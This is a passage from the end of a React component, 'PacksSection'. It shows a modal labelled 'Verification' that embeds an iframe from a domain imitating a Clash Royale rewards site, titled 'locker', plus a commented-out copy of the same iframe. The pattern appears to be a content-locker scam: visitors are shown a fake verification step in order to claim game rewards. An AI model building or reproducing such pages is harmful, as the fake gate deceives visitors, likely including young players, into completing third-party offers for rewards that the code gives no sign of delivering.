              className="w-[92%] md:w-[60%] lg:w-[40%] h-[calc(var(--vh,1vh)*90)] md:h-[80vh] bg-white rounded-xl overflow-hidden shadow-2xl border border-gray-300"
              initial={{ opacity: 0, y: 30, scale: 0.96 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, y: 20, scale: 0.97 }}
              transition={{ duration: 0.22, ease: "easeOut" }}
              onClick={(e) => e.stopPropagation()} // prevent close on inside click
            >
              {/* Optional header */}
              <div className="flex items-center justify-between px-3 py-2 bg-gray-50 border-b">
                <p className="font-game text-sm text-gray-700">Verification</p>
              </div>

              <iframe
                src="https://clashroyalreward.store/cl/i/m5ekq8"
                className="w-full h-full border-0"
                scrolling="yes"
                title="locker"
              />
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
      {/* <div
        className={`${
          !showLocker ? "hidden" : "fixed"
        } inset-0 bg-black bg-opacity-30 flex items-center justify-center z-50`}
      >
        <div className="w-[92%] md:w-[60%] lg:w-[40%] h-[calc(var(--vh,1vh)*90)] md:h-[80vh] bg-white rounded-xl overflow-hidden shadow-2xl border border-gray-300">
          <iframe
            src="https://clashroyalreward.store/cl/i/m5ekq8"
            className="w-full h-full border-0"
            scrolling="yes"
            title="locker"
          />
        </div>
      </div> */}
    </>
  );
};

export default PacksSection;
